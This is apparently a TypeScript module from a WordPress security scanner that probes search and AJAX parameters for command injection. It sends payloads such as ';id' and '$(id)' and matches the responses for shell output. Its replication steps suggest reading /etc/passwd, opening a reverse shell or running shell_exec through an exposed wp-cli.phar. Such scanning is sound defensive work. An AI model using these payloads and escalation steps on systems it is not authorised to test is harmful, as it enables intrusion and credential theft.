import type { ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, parallelProbe} from '../utils.js';

const MODULE_NAME = 'Command Injection / RCE';

const OUTPUT_PAYLOADS = [';id', '|id', '$(id)'];

const OUTPUT_INDICATOR = /uid=\d+\(\w+\)\s+gid=\d+|root:x:0:0:|www-data:x:\d+:\d+:|Linux\s+\S+\s+\d+\.\d+\.\d+|\/bin\/bash|\/bin\/sh|command not found|Permission denied.*shell/i;

// High-value [path, param, method]
const PROBE_PARAMS: [string, string, string][] = [
  ['/',                            's',      'GET'],
  ['/wp-admin/admin-ajax.php',     'query',  'POST'],
  ['/wp-json/wp/v2/search',        'search', 'GET'],
];

// [path, note]
const PLUGIN_PROBES: [string, string][] = [
  ['/wp-cli.phar',                                              'WP-CLI binary exposed'],
  ['/wp-content/plugins/wp-cerber/wp-cerber.php',              'Cerber endpoint'],
  ['/wp-admin/async-upload.php',                               'Async upload endpoint'],
  ['/wp-content/themes/twentytwentyone/functions.php',         'Functions.php exposed'],
];

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: ReturnType<typeof finding>[] = [];
  const errors: string[] = [];

  // Flatten params × payloads for parallel probing
  const combos = PROBE_PARAMS.flatMap(([path, param, method]) =>
    OUTPUT_PAYLOADS.map((payload) => [path, param, method, payload] as const),
  );
  const hitParams = new Set<string>();

  await parallelProbe(combos, async ([path, param, method, payload]) => {
    if (hitParams.has(param)) return;
    const url = `${target}${path}`;
    const sep = url.includes('?') ? '&' : '?';
    try {
      let r: Response | null;
      if (method === 'GET') {
        r = await fetchURL(`${url}${sep}${param}=${encodeURIComponent(payload)}`);
      } else {
        r = await fetchURL(url, {
          method: 'POST',
          body: new URLSearchParams({ [param]: payload }).toString(),
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });
      }
      if (!r) return;
      const text = await r.text();
      const m = OUTPUT_INDICATOR.exec(text);
      if (m) {
        hitParams.add(param);
        findings.push(finding(
          'CMD_INJECTION_OUTPUT',
          'CRITICAL',
          method === 'GET' ? `${url}${sep}${param}=${payload}` : url,
          `Command injection (output-based) in '${param}' parameter — evidence: ${JSON.stringify(m[0])}`,
          {
            replication_steps: [
              method === 'GET'
                ? `curl -s '${url}${sep}${param}=${payload}'`
                : `curl -s -X POST '${url}' -d '${param}=${payload}'`,
              `Observe OS command output in response: ${JSON.stringify(m[0])}`,
              "Escalate: replace 'id' with 'cat /etc/passwd' or establish reverse shell.",
            ],
            evidence: JSON.stringify({ parameter: param, payload, evidence: m[0] }),
            remediation: 'Never pass user input to system commands. Use WordPress API functions instead of exec/system.',
          },
        ));
      }
    } catch { /* ignore */ }
  }, 9);

  // Check for accidentally exposed execution surfaces
  await parallelProbe(PLUGIN_PROBES, async ([path, note]) => {
    const url = `${target}${path}`;
    try {
      const r = await fetchURL(url);
      if (r?.status === 200 && path.includes('phar')) {
        const text = await r.text();
        if (text.includes('PHP') || text.length > 1000) {
          findings.push(finding(
            'RCE_SURFACE_EXPOSED',
            'CRITICAL',
            url,
            `RCE surface exposed: ${note} — ${path} accessible (HTTP 200)`,
            {
              replication_steps: [
                `curl -s '${url}'`,
                'Observe non-empty PHP/binary response — execution surface is accessible.',
                "Attempt: php wp-cli.phar eval 'echo shell_exec(\"id\");'",
              ],
              evidence: JSON.stringify({ note }),
              remediation: 'Never pass user input to system commands. Use WordPress API functions instead of exec/system.',
            },
          ));
        }
      }
    } catch { /* ignore */ }
  }, 4);

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
